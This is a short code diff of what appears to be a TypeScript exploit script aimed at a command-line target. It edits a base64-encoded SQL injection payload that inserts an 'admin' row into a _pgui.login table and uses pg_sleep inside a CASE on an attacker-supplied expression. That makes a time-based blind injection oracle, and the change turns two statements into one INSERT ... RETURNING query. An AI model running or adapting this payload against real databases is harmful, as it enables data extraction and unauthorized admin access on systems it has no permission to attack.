@@ -24,9 +24,8 @@ const target = process.argv[2];
 const tryExp = async (exp: string) => {
     let query = Buffer.from(`
 INSERT INTO _pgui.login (id, username)
-SELECT nextval('_pgui.login_id_seq')+1, 'admin';
-
-SELECT pg_sleep (
+SELECT nextval('_pgui.login_id_seq')+1, 'admin'
+RETURNING pg_sleep (
     CASE WHEN (${exp}) THEN 2 ELSE 0 END
 );
     `).toString("base64");
